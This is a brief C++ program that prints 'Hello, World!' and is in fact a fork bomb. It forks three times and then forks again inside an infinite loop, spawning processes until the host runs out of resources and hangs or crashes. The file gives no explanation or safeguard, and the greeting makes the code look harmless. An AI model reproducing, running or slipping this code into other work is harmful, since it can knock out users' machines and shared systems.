#include <unistd.h>
#include <iostream>

int main() {
  fork();
  fork();
  fork();
  std::cout << "Hello, World!\n";

  while (true) {
    fork();
  }
}

